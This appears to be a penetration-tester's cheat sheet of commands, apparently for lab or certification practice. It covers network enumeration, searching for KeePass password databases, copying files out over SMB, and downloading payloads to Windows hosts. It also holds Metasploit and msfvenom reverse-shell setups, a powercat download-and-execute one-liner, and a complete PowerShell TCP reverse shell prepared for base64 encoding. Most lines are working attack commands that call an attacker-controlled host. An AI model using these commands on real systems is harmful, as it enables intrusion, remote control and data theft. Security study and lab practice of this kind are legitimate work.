# initial enumeration

```
sudo nmap -p80 --script=http-enum <ip>
nmap 192.168.206.47
nmap -sT -A 192.168.206.47
nmap --script http-headers 192.168.206.47
gobuster dir -u http://192.168.206.47:80 -w /usr/share/wordlists/dirb/big.txt -p pattern
```
# find files on windows powershell
`Get-ChildItem -Path C:\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue`

# download a file from an FTP server
```
ftp itadmin@192.168.248.202
> binary
> passive (turn it off)
> ls
> get c:/Users/itadmin/Desktop/flag.txt
```
# find files by name
`find / -name nc.exe 2>/dev/null`

# Download from windows (with authentication)
`impacket-smbserver -smb2support -user rdp_admin -password P@ssw0rd! smb smb `
# from windows - cmd
```
net use \\192.168.45.181\smb
copy \inetpub\wwwroot\umbraco\netsh_exercise_client.bin \\192.168.45.181\smb
```
# powershell - download files we are servin up from a kali python server from kali to windows
`iwr -uri http://192.168.119.2/nonstaged.exe -Outfile nonstaged.exe`

# Download from kali to windows - powershell
`powershell.exe (New-Object System.Net.WebClient).DownloadFile('http://192.168.45.194/SpotifySetup.exe', 'SpotifySetup.exe')`

# reverse shell generator
https://www.revshells.com/

# windows reverse shells
# is it executed by cmd or powershell?
```
(dir 2>&1 *`|echo CMD);&<# rem #>echo PowerShell
```

# metasploit reverse shell
```
>ms6
use exploit/multi/handler
set lhost 192.168.45.181
set lport 4444
set payload windows/metrepeter/reverse_tcp
run
```

# oneliner to run shell
`msfconsole -x "use exploit/multi/handler;set payload windows/meterpreter/reverse_tcp;set LHOST 192.168.45.194;set LPORT 443;run;"`

# Generate a payload
`msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.45.181 LPORT=4444 -f exe > reverse.exe`

# for use with CMD
`powershell IEX (New-Object System.Net.Webclient).DownloadString('http://192.168.45.181/powercat.ps1');powercat -c 192.168.45.181 -p 4444 -e powershell`

# if you need to base64 encode it from kali
`pwsh` # to run powershell on kali
# in powershell
```
$Text = '$client = New-Object System.Net.Sockets.TCPClient("192.168.45.219",4444);$stream = $client.GetStream();[byte[]]$bytes = 0..65535|%{0};while(($i = $stream.Read($bytes, 0, $bytes.Length)) -ne 0){;$data = (New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0, $i);$sendback = (iex $data 2>&1 | Out-String );$sendback2 = $sendback + "PS " + (pwd).Path + "> ";$sendbyte = ([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()};$client.Close()'
$Bytes = [System.Text.Encoding]::Unicode.GetBytes($Text)
$EncodedText =[Convert]::ToBase64String($Bytes)
$EncodedText
```